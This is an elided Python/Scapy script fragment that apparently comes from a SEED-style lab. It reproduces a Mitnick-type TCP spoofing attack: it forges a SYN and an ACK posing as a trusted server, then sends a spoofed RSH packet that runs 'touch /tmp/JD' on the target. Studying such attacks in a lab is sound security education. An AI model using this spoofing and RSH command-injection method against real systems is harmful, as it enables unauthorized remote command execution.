...
def pktspoofing(pkt):
	...
	if old_tcp.flags == "SA":
		...
		tcp_layer = TCP(sport=Trusted_Server_Port,dport=X_Terminal_Port,flags="A",seq=sequence_no, ack= old_ip.seq + 1)
		pkt = ip_layer/tcp_layer # Create the ACK packet
		send(pkt,verbose=0)

		# After sending ACK packet
		print("Sending Spoofed RSH Data Packet To ADD a Temporary File 'JD' to X-Terminal...")
		data = '9090\x00seed\x00seed\x00touch /tmp/JD\x00' # Runs the touch command on the x-terminal
...
def spoofSYN():
	...
	pkt = ip_layer/tcp_layer # Create the SYN packet
	send(pkt,verbose=0)

def main():
	spoofSYN()
	myFilter = "tcp and src host 10.0.2.8" # Filter to be applied while sniffing
